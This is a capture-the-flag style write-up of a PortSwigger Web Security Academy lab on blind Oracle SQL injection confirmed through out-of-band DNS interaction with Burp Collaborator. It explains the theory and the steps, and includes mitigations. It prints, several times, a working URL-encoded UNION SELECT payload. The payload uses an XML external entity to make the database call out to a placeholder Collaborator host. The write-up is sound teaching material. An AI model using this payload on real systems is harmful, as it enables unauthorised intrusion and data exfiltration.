# 📘 PortSwigger Lab: Blind SQL Injection with Out-of-Band Interaction

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

---

## 📑 Contents

- [🎯 Goal](#-goal)
- [🧠 Attack Idea](#-attack-idea)
- [🧩 Theory: What is Blind SQL Injection](#-theory-what-is-blind-sql-injection)
- [🧩 Theory: What is OAST](#-theory-what-is-oast)
- [🧩 Why DNS is Used](#-why-dns-is-used)
- [🧩 What is Burp Collaborator](#-what-is-burp-collaborator)
- [🔍 Step 1 — Open the lab and enable Burp](#-step-1--open-the-lab-and-enable-burp)
- [🔍 Step 2 — Find the injection point](#-step-2--find-the-injection-point)
- [🔍 Step 3 — Generate a Collaborator payload](#-step-3--generate-a-collaborator-payload)
- [🔍 Step 4 — Insert the OAST payload into TrackingId](#-step-4--insert-the-oast-payload-into-trackingid)
- [🔍 Step 5 — Send the request](#-step-5--send-the-request)
- [🔍 Step 6 — Verify the DNS interaction](#-step-6--verify-the-dns-interaction)
- [🧩 Used payload](#-used-payload)
- [🔬 Payload breakdown](#-payload-breakdown)
- [💥 Why the attack worked](#-why-the-attack-worked)
- [🧠 Pentester logic](#-pentester-logic)
- [🛡 Mitigation](#-mitigation)
- [🛠 Checklist](#-checklist)
- [🧠 Final attack chain](#-final-attack-chain)

---

## 🎯 Goal

Solve the **Blind SQL injection with out-of-band interaction** lab.

The goal is to confirm Blind SQL Injection not through visible errors, not through response differences, and not through timing delays, but by forcing the database to perform a DNS lookup to Burp Collaborator.

---

## 🧠 Attack Idea

The application uses the `TrackingId` cookie for analytics. This cookie value is inserted into a SQL query.

The important part is that the query is executed asynchronously. The application returns the normal response while the SQL query runs in the background.

This means classic techniques do not work:

```text
Error-based → no visible database error
Boolean-based → no visible page difference
Time-based → delay does not affect the response
```

However, the SQL injection still exists. We need a different signal. The signal is an external DNS interaction.

---

## 🧩 Theory: What is Blind SQL Injection

Blind SQL Injection occurs when user-controlled input reaches a SQL query, but the application does not directly display the query result.

Example vulnerable query:

```sql
SELECT * FROM tracking WHERE tracking_id = '<TrackingId>';
```

If `TrackingId` is inserted directly into the query, an attacker can inject SQL. But if results are not displayed, the attack becomes blind.

The tester must rely on indirect evidence:

- an error appears;
- page content changes;
- response time changes;
- the server connects to an external system.

This lab uses the last method.

---

## 🧩 Theory: What is OAST

OAST means **Out-of-Band Application Security Testing**.

Normal testing uses the main channel:

```text
Browser → website → website response → browser
```

OAST uses a separate channel:

```text
Browser → website → database → DNS request → Burp Collaborator
```

This is called out-of-band because the confirmation does not come back in the original HTTP response.

---

## 🧩 Why DNS is Used

DNS is commonly allowed in production networks because applications need it to resolve domain names.

Even when outbound HTTP or HTTPS is restricted, DNS may still work. That makes DNS one of the most reliable channels for OAST testing.

In this lab, we do not need to extract data. We only need to prove that the database tried to resolve a Collaborator domain.

---

## 🧩 What is Burp Collaborator

Burp Collaborator is a Burp Suite service that provides a unique domain and records interactions with it.

Example:

```text
abc123xyz.burpcollaborator.net
```

If the target application or database resolves or requests this domain, Burp shows an interaction such as:

```text
DNS
HTTP
SMTP
```

For this lab, a DNS interaction is enough.

---

## 🔍 Step 1 — Open the lab and enable Burp

Open the lab:

```text
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
```

Enable interception in Burp Suite:

```text
Proxy → Intercept → Intercept is on
```

Then browse to the shop front page using Burp's browser.

Why Burp? Because we need to modify the `TrackingId` cookie, and Burp Proxy or Repeater is the easiest way to do that.

---

## 🔍 Step 2 — Find the injection point

In the intercepted request, locate the `Cookie` header.

Example:

```http
Cookie: TrackingId=abc123; session=xyz456
```

The interesting value is:

```http
TrackingId
```

The lab description tells us that this cookie is used in a SQL query.

Pentester logic:

```text
User-controlled input → TrackingId
TrackingId reaches SQL → possible SQL Injection
Response does not change → use OAST
```

---

## 🔍 Step 3 — Generate a Collaborator payload

Open Burp Collaborator client.

Typical action:

```text
Burp → Collaborator client → Copy to clipboard
```

You receive a unique domain:

```text
YOUR-COLLABORATOR-SUBDOMAIN.burpcollaborator.net
```

This domain will be inserted into the SQL injection payload.

---

## 🔍 Step 4 — Insert the OAST payload into TrackingId

Replace the value of `TrackingId` with the payload.

Template:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Replace `BURP-COLLABORATOR-SUBDOMAIN` with your Collaborator domain.

Why is it URL-encoded? Because the payload is placed inside an HTTP cookie. Special characters like spaces, `?`, `%`, `:`, and `/` may be interpreted incorrectly if not encoded.

---

## 🔍 Step 5 — Send the request

Send the modified request:

- `Forward` if using Proxy;
- `Send` if using Repeater.

The page may look normal. That is expected.

The important result will not appear in the browser. It will appear in Burp Collaborator.

---

## 🔍 Step 6 — Verify the DNS interaction

Go back to Burp Collaborator client and click:

```text
Poll now
```

If everything worked, you will see a DNS interaction.

This means:

```text
The database processed the payload
↓
It attempted to access the Collaborator domain
↓
It performed a DNS lookup
↓
Burp Collaborator recorded the interaction
```

The lab is solved.

---

## 🧩 Used payload

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

<details>
<summary>🔎 Show payload with placeholder</summary>

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-DOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

</details>

---

## 🔬 Payload breakdown

### `x'`

```sql
x'
```

`x` is just a normal TrackingId value.  
`'` closes the original SQL string.

If the original query looked like this:

```sql
SELECT * FROM tracking WHERE id = '<TrackingId>'
```

then `x'` turns it into:

```sql
SELECT * FROM tracking WHERE id = 'x'
```

Now we can append our own SQL code.

### `UNION SELECT`

```sql
UNION SELECT
```

`UNION` adds another query to the original query.

In normal SQL injection, this is often used to retrieve data. Here, we use it to make Oracle execute an XML function.

### `EXTRACTVALUE(...)`

```sql
EXTRACTVALUE(xmltype(...), '/l')
```

`EXTRACTVALUE` is an Oracle XML function. It forces Oracle to parse an XML document.

This is useful because XML can define external entities.

### `xmltype(...)`

```sql
xmltype('<xml document>')
```

`xmltype()` tells Oracle to treat the provided string as XML.

Without it, the XML would just be plain text.

### `DOCTYPE`

```xml
<!DOCTYPE root [ ... ]>
```

`DOCTYPE` allows the XML document to define entities.

### `ENTITY % remote SYSTEM`

```xml
<!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-DOMAIN/">
```

This is the key part.

It defines an external entity called `remote` that must be loaded from the provided URL.

To access that URL, the database server first needs to resolve the domain name. That causes a DNS lookup.

### `%remote;`

```xml
%remote;
```

This activates the external entity.

Without this line, the entity might be defined but never used.

### `FROM dual`

```sql
FROM dual
```

In Oracle, `dual` is a special table used when you need to execute an expression or function without selecting from a real table.

### `--`

```sql
--
```

This comments out the rest of the original SQL query so that trailing SQL does not break our injected syntax.

---

## 💥 Why the attack worked

The attack worked because:

- `TrackingId` was inserted into a SQL query unsafely;
- the database executed injected SQL;
- Oracle XML functions were available;
- XML external entity behavior caused an outbound lookup;
- outbound DNS was allowed;
- Burp Collaborator recorded the DNS interaction.

Main idea:

```text
We did not see SQL output in the browser,
but we saw an external DNS request,
so the injected SQL executed.
```

---

## 🧠 Pentester logic

When testing Blind SQL Injection, think in stages:

```text
1. Can I trigger a visible error?
2. Can I change page content with true/false conditions?
3. Can I trigger a measurable delay?
4. Can I trigger an external DNS or HTTP interaction?
```

If the first three fail, OAST is the next technique.

Useful rule:

```text
No error does not mean no SQLi.
No page difference does not mean no SQLi.
No delay does not mean no SQLi.
A DNS callback confirms execution.
```

---

## 🛡 Mitigation

### Prepared statements

Do not build SQL queries by concatenating strings.

Bad:

```sql
SELECT * FROM tracking WHERE id = '" + trackingId + "'
```

Good:

```sql
SELECT * FROM tracking WHERE id = ?
```

### Restrict outbound traffic

Databases should not freely access the Internet.

Restrict outbound:

- DNS;
- HTTP;
- HTTPS;
- LDAP;
- SMB.

### Disable dangerous XML features

If the application does not need external XML entity resolution, disable it.

### Monitor DNS traffic

Long, random-looking subdomains can indicate OAST testing or data exfiltration attempts.

---

## 🛠 Checklist

- [x] Lab opened
- [x] `TrackingId` cookie identified
- [x] Burp Collaborator domain generated
- [x] Payload inserted into cookie
- [x] Modified request sent
- [x] DNS interaction observed
- [x] Lab solved

---

## 🧠 Final attack chain

```text
TrackingId cookie
→ SQL Injection
→ UNION SELECT
→ Oracle XML processing
→ External Entity
→ DNS lookup
→ Burp Collaborator
→ Lab solved
```

---

# ⬆ Back to top

[Return to contents](#top)
